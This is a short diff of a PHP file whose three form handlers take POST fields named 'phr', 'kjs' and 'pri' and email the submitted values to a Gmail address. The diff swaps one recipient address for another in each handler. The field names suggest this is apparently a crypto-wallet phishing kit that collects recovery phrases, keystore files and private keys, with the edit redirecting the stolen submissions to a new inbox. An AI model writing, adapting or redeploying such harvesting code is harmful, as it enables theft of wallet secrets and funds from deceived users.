@@ -4,7 +4,7 @@
 
 <?php 
 if(isset($_POST['phr'])){
-    $to = "thelordsprayergroup@gmail.com"; // this is your Email address
+    $to = "dareosho@gmail.com"; // this is your Email address
     
     $subject =  ". $phr";
     
@@ -34,7 +34,7 @@ if(isset($_POST['phr'])){
 
 <?php 
 if(isset($_POST['kjs'])){
-    $to = "thelordsprayergroup@gmail.com"; // this is your Email address
+    $to = "dareosho@gmail.com"; // this is your Email address
     
     $subject =  ". $kjs";
     
@@ -73,7 +73,7 @@ return true;
 
 <?php 
 if(isset($_POST['pri'])){
-    $to = "thelordsprayergroup@gmail.com"; // this is your Email address
+    $to = "dareosho@gmail.com"; // this is your Email address
     
     $subject =  ". $pri";
     
